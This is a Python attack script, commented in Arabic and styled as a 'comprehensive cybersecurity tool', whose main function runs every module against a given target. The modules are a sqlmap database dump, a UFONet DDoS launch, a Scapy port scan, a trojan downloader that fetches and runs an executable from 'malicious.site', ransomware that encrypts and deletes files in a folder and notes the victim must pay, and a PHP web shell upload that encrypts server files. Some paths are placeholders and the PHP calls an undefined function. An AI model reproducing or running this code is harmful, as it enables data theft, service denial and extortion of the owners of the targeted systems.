import requests
import subprocess
from concurrent.futures import ThreadPoolExecutor
import os
from colorama import Fore, Style, init
import time
import random
import logging
import sqlite3
import threading
from cryptography.fernet import Fernet
from scapy.layers.inet import IP, ICMP, TCP
from scapy.sendrecv import sr, sr1
import re
import socket
import whois
import argparse

# تفعيل الألوان
init(autoreset=True)

# تفعيل السجلات
logging.basicConfig(filename="security_tool_log.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# الفئة الأساسية
class SecurityTool:
    """الطبقة الأساسية للسكربت الشامل للأمن السيبراني"""
    
    def __init__(self, target):
        self.results_log = []
        self.version = "3.1"
        self.author = "Your Name"
        self.target = target

    def log_result(self, message, color=Fore.WHITE):
        """تسجيل النتائج بالألوان وكتابتها في السجل"""
        print(color + message + Style.RESET_ALL)
        logging.info(message)
        self.results_log.append(message)

# دالة لفحص SQLMap
class ExploitModule(SecurityTool):
    """وحدة الهجمات والاستغلال"""

    def run_sqlmap(self):
        """تشغيل فحص SQLMap"""
        self.log_result("Starting comprehensive SQLMap scan...", color=Fore.GREEN)
        commands = [
            [
                "sqlmap", "-u", f"{self.target}/vulnerable.php?id=1 OR 1=1", "--batch", "--level=5",
                "--risk=3", "--tamper=space2comment,charencode,randomcase,between",
                "--random-agent", "--crawl=10", "--threads=10", "--technique=BEUSTQ",
                "--time-sec=10", "--output-dir=sqlmap_output", "--dbs", "--dump-all"
            ],
            [
                "sqlmap", "-u", f"{self.target}/vuln?OR1=1", "--batch", "--level=5", "--risk=3",
                "--random-agent", "--tamper=space2comment,between,randomcase",
                "--technique=BEUSTQ", "--time-sec=10", "--output-dir=sqlmap_output", "--dbs", "--dump-all"
            ]
        ]
        for command in commands:
            try:
                self.log_result(f"Running SQLMap command: {' '.join(command)}", color=Fore.CYAN)
                subprocess.run(command, check=True)
                self.log_result(f"SQLMap scan completed for command: {command}", color=Fore.YELLOW)
            except subprocess.CalledProcessError as e:
                self.log_result(f"Error in SQLMap scan: {e}", color=Fore.RED)

# إضافة هجوم DDoS باستخدام UFONet
class DDoSModule(SecurityTool):
    """وحدة هجوم DDoS باستخدام UFONet"""
    
    def run_ddos(self):
        """تشغيل هجوم DDoS باستخدام UFONet"""
        self.log_result("Starting DDoS attack using UFONet...", color=Fore.RED)
        if not os.path.exists('ufonet.py'):
            self.log_result("ufonet.py not found! Please make sure the file is in the correct directory.", color=Fore.RED)
            return
        try:
            command = [
                "python3", "/path/to/ufonet.py", "-t", self.target, "--httptype", "GET", "--threads", "100"
            ]
            subprocess.run(command, check=True)
            self.log_result("DDoS attack completed.", color=Fore.YELLOW)
        except subprocess.CalledProcessError as e:
            self.log_result(f"Error in DDoS attack: {e}", color=Fore.RED)

# إضافة قاعدة بيانات الثغرات
class VulnerabilityDatabase:
    """قاعدة بيانات الثغرات المحلية"""

    def __init__(self, db_file="vulnerabilities.db"):
        self.conn = sqlite3.connect(db_file)
        self.cursor = self.conn.cursor()
        self.create_table()

    def create_table(self):
        """إنشاء جدول الثغرات في قاعدة البيانات"""
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY,
            cve_id TEXT,
            description TEXT,
            severity TEXT,
            date_published TEXT
        )''')
        self.conn.commit()

    def insert_vulnerability(self, cve_id, description, severity, date_published):
        """إضافة ثغرة جديدة إلى قاعدة البيانات"""
        self.cursor.execute("INSERT INTO vulnerabilities (cve_id, description, severity, date_published) VALUES (?, ?, ?, ?)",
                            (cve_id, description, severity, date_published))
        self.conn.commit()

    def search_vulnerabilities(self, cve_id):
        """البحث عن ثغرة باستخدام CVE ID"""
        self.cursor.execute("SELECT * FROM vulnerabilities WHERE cve_id = ?", (cve_id,))
        return self.cursor.fetchall()

    def close(self):
        """إغلاق الاتصال بقاعدة البيانات"""
        self.conn.close()

# إضافة فحص الشبكة باستخدام Scapy
class ScanModule(SecurityTool):
    """وحدة مسح الأنظمة والشبكات"""

    def scan_network(self):
        """إجراء مسح عميق على الشبكة باستخدام Scapy"""
        self.log_result(f"Scanning network for open ports on {self.target}...", color=Fore.CYAN)
        try:
            ans, _ = sr(IP(dst=self.target)/ICMP(), timeout=2)
            for snd, rcv in ans:
                self.log_result(f"Host {rcv.src} is up!", color=Fore.YELLOW)
                self.scan_ports(rcv.src)
        except Exception as e:
            self.log_result(f"Error in network scan: {e}", color=Fore.RED)

    def scan_ports(self, target_ip):
        """مسح المنافذ المفتوحة"""
        for port in range(20, 1025):
            pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
            response = sr1(pkt, timeout=1, verbose=0)
            if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 18:
                self.log_result(f"Port {port} is open on {target_ip}.", color=Fore.YELLOW)

# إضافة الهجمات البرمجية الخبيثة
class TrojanModule(SecurityTool):
    """وحدة هجوم حصان طروادة"""

    def deploy_trojan(self):
        """نقل وتشغيل حصان طروادة على النظام"""
        self.log_result("Deploying Trojan...", color=Fore.RED)
        try:
            trojan_url = "http://malicious.site/trojan.exe"
            trojan_file = "/path/to/trojan.exe"
            r = requests.get(trojan_url)
            with open(trojan_file, "wb") as file:
                file.write(r.content)
            
            subprocess.run([trojan_file], check=True)
            self.log_result("Trojan deployed and executed successfully.", color=Fore.GREEN)
        except Exception as e:
            self.log_result(f"Error deploying Trojan: {e}", color=Fore.RED)

# إضافة هجوم Ransomware
class RansomwareModule(SecurityTool):
    """وحدة هجوم Ransomware"""

    def generate_key(self):
        """توليد مفتاح تشفير Ransomware"""
        key = Fernet.generate_key()
        with open("ransomware.key", "wb") as key_file:
            key_file.write(key)
        return key

    def encrypt_file(self, file_path, key):
        """تشفير ملف باستخدام المفتاح"""
        fernet = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        with open(file_path + ".locked", "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(file_path)

    def run_ransomware(self):
        """تشغيل هجوم Ransomware"""
        self.log_result("Starting Ransomware attack...", color=Fore.RED)
        key = self.generate_key()
        folder_to_encrypt = "/path/to/target/folder"
        for root, dirs, files in os.walk(folder_to_encrypt):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path, key)
                self.log_result(f"Encrypted file: {file_path}", color=Fore.YELLOW)
        self.log_result("Ransomware attack completed. Files are encrypted.", color=Fore.GREEN)

        # سيتم حفظ المفتاح للمطالبة بالفدية
        self.log_result("Encryption key saved to ransomware.key. Victim must pay to get it.", color=Fore.RED)

# إضافة حقن Web Shell
class WebShellInjectionModule(SecurityTool):
    """وحدة حقن Web Shell لتنفيذ Ransomware"""

    def inject_webshell(self):
        """حقن Web Shell في الخادم المستهدف"""
        webshell_url = "http://target.com/uploads/shell.php"
        payload = '''<?php
            if(isset($_GET['ransom'])){
                $key = file_get_contents('ransomware.key');
                $dir = '/path/to/target/folder';
                foreach(glob($dir.'/*') as $file) {
                    $content = file_get_contents($file);
                    file_put_contents($file.".locked", encrypt($content, $key));
                    unlink($file);
                }
            }
        ?>'''

        try:
            # محاولة تحميل السكربت على الخادم
            requests.post(webshell_url, data={"payload": payload})
            self.log_result(f"Successfully injected web shell at {webshell_url}", color=Fore.RED)
        except Exception as e:
            self.log_result(f"Failed to inject web shell: {e}", color=Fore.RED)

# تشغيل السكربت
def main():
    parser = argparse.ArgumentParser(description="Comprehensive Cybersecurity Tool")
    parser.add_argument('target', help="Target URL or IP address")
    
    args = parser.parse_args()
    target = args.target

    tool = SecurityTool(target)
    tool.log_result(f"Starting attack on {target}...", color=Fore.GREEN)

    # تشغيل الوحدات المختلفة
    exploit_module = ExploitModule(target)
    exploit_module.run_sqlmap()

    ddos_module = DDoSModule(target)
    ddos_module.run_ddos()

    scan_module = ScanModule(target)
    scan_module.scan_network()

    trojan_module = TrojanModule(target)
    trojan_module.deploy_trojan()

    ransomware_module = RansomwareModule(target)
    ransomware_module.run_ransomware()

    webshell_module = WebShellInjectionModule(target)
    webshell_module.inject_webshell()

if __name__ == "__main__":
    main()
